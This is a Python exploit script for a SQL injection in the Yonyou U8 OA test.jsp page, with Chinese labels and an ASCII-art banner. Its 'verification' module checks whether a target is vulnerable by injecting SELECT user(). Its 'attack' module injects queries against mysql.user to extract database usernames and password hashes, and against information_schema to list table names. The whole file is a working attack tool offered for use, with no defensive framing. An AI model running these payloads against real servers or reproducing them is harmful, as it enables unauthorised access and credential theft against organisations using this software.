# encoding: utf-8
import requests
import sys
import argparse

def get_args():
    parser=argparse.ArgumentParser(
            prog='u8.py',description='input url to run the script')
    parser.add_argument("-u","--url",type=str,help='input url')
    parser.add_argument("-v","--version",action='version',version='%(prog)s 1.0')
    args=parser.parse_args()
    return args

def attack():
    print("-----------------------")
    print("|       payload       |")
    print("-----------------------")
    print("|1.获取账号|2.获取表名|")
    print("-----------------------")
    a=input("payload>")
    return a

def main():
    try:
        print(r"""                                ,-.
                               ( O_)
                              / `-/
                             /-. /
                            /   )
                           /   /  
              _           /-. /
             (_)*-._     /   )
               *-._ *-'**( )/    
                   *-/*-._* `. 
                    /     *-.'._
                   /\       /-._*-._
                  /  ) _,-*/    *-(_)
                 / // /   /
 _     _        /    _   / _ ____                       _ 
| |   (_) __ _ _   _(_) __| / ___|_      _____  _ __ __| |
| |   | |/ _` | | | | |/ _` \___ \ \ /\ / / _ \| '__/ _` |
| |___| | (_| | |_| | | (_| |___) \ V  V / (_) | | | (_| |
|_____|_|\__, |\__,_|_|\__,_|____/ \_/\_/ \___/|_|  \__,_|
            |_|                                                 
         /  / /    /
        /  / / L  /        
       /  / / Z  /
      /  / / J  /  
     /  |,'    /  
    :   /     /
    [  /   ,'     
    | /  ,'      
    |/,-'
    '
          """)       
        print("***********************************")
        print("* 用友 U8 OA test.jsp SQL注入漏洞 *")
        print("*          V1.0  by 液体剑        *")
        print("***********************************\n")
        print("-------------------------")
        print("|          模块         |")
        print("-------------------------")
        print("| 1.验证模块| 2.攻击模块|")
        print("-------------------------")

        c=input('请选择模块>')
        c=int(c)
        args=get_args()
        url=args.url
        if(c==1):
            payload='/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20user())'
            req=requests.get(url+payload)
            res=req.text
            if('root@localhost' in res):
                print('\033[0;32;40m[*] 存在漏洞:\033[0m',url+payload)
                print('\033[0;32;40m[*] username:\033[0m',res[332:346])
            else:
                print('\033[0;31;40m[-]不存在漏洞:\033[0m',url)
        else:
            path="/yyoa/common/js/menu/test.jsp?doType=101&S1="
            payload1="(SELECT%20*%20from%20mysql.user)"
            payload2="(SELECT%20table_name%20from%20information_schema.tables%20where%20table_schema=database())"
            a=attack()
            if(a=="1"):
                req=requests.get(url+path+payload1)
                res=req.text
                print("\033[0;32;40m[*] username:\033[0m"+res[1216:1220])
                print("\033[0;32;40m[*] password:\033[0m"+res[1243:1284])
            if(a=="2"):
                print("\033[0;32;40m[*] 请访问URL:\033[0m"+url+path+payload2)
    except:
        print("\033[0;31;40mERROR!\033[0m")
        
if __name__ == "__main__":
    get_args()
    main()

